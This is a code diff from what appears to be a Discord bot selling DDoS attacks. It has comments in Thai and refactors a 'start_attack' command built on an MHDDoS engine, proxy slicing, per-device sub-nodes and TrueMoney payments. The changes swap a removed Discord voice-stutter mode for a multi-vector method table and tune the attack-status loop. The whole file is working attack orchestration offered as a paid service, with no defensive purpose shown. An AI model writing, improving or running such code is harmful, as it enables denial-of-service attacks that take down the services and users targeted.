@@ -16,11 +16,10 @@ from config import (
     MAX_DURATION, MAX_DEVICES_PURCHASE, MAX_WARNINGS,
     MAX_RESPAWN_ATTEMPTS,
     FORBIDDEN_TLDS, FORBIDDEN_IPS,
-    SUB_NODES_PER_DEVICE, THREADS_PER_SUB_NODE,
-    VOICE_PORT_MIN, VOICE_PORT_MAX, ENABLE_MULTI_VECTOR,
+    THREADS_PER_SUB_NODE,
 )
 from database import Database
-from mhddos_engine import MHDDoSEngine, L4_MODULES
+from mhddos_engine import MHDDoSEngine, L4_MODULES, MULTI_VECTOR
 from proxy_manager import ProxyManager
 from truemoney import TrueMoneyClient
 from ui_components import (
@@ -295,31 +294,26 @@ async def start_attack(interaction: discord.Interaction, module: str,
         )
         return
 
-    # auto-detect voice stutter mode
-    if module == "discord" and ENABLE_MULTI_VECTOR:
-        module = "voice_amp"
-
-    # defer แบบ ephemeral — ทั้ง flow ซ่อน 2 ต่อ 2
     await interaction.response.defer(ephemeral=True)
 
-    # รอ proxy pool — max 30 วิ
     if not proxy_mgr.ready.is_set():
         try:
             await asyncio.wait_for(proxy_mgr.ready.wait(), timeout=30)
         except asyncio.TimeoutError:
             pass
 
-    # เตรียม proxy slices
-    sub_nodes = devices * SUB_NODES_PER_DEVICE
+    # จำนวน sub-node = devices × len(methods)
+    methods = MULTI_VECTOR.get(module, [])
+    if not methods:
+        await interaction.followup.send(
+            f"ไม่รู้จัก module: {module}", ephemeral=True
+        )
+        return
+
+    sub_nodes = devices * len(methods)
     slices = proxy_mgr.slice_for_subnodes(sub_nodes)
     pool_size = len(proxy_mgr.proxies or [])
 
-    # log voice port range ถ้าเป็น voice mode
-    if module in ("discord", "voice_amp"):
-        print(f"[VOICE] target={target} port={port} "
-              f"range={VOICE_PORT_MIN}-{VOICE_PORT_MAX}")
-
-    # spawn
     try:
         nodes = await engine.start(user_id, module, target,
                                     port, duration, devices, slices)
@@ -347,7 +341,7 @@ async def start_attack(interaction: discord.Interaction, module: str,
         kwargs["file"] = f
     try:
         msg = await interaction.followup.send(**kwargs)
-    except Exception:
+    except Exception as e:
         await engine.stop(user_id)
         traceback.print_exc()
         return
@@ -377,7 +371,6 @@ async def _attack_loop(user_id: int, state: dict):
             elapsed = time.time() - state["start"]
             left = max(0, duration - int(elapsed))
 
-            # ครบเวลา → success
             if left <= 0:
                 await engine.stop(user_id)
                 active_attacks.pop(user_id, None)
@@ -391,10 +384,8 @@ async def _attack_loop(user_id: int, state: dict):
                     pass
                 return
 
-            # นับ alive
             alive, total = engine.alive_count(user_id)
 
-            # ตายหมดจริงๆ (respawn เกิน limit แล้ว)
             if alive == 0 and total > 0:
                 engine.running.pop(user_id, None)
                 active_attacks.pop(user_id, None)
@@ -411,7 +402,6 @@ async def _attack_loop(user_id: int, state: dict):
                     pass
                 return
 
-            # update
             if is_l4:
                 speed = "N/A (L4)"
             else:
